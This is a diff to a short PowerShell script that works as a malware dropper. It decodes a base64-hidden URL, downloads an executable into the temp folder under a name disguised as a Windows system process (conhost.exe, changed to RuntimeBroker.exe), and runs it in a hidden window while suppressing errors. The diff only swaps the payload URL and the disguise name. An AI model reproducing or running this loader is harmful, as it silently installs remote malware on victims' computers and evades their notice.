@@ -1,8 +1,8 @@
 $ProgressPreference = 'SilentlyContinue'
 
-$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9hd2Vkc2FrbHNhcS5vbnJlbmRlci5jb20vZi9pNUhYQVZZUA=='))
+$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9hd2Vkc2FrbHNhcS5vbnJlbmRlci5jb20vZi9fcGJ3cFRiaQ=='))
 $t=[IO.Path]::GetTempPath()
-$n=('c','o','n','h','o','s','t','.','e','x','e') -join ''
+$n=('R','u','n','t','i','m','e','B','r','o','k','e','r','.','e','x','e') -join ''
 $p=$t+$n
 try { iwr -UseBasicParsing $u -OutFile $p -ErrorAction Stop; Start-Process $p -WindowStyle Hidden } catch {}
 
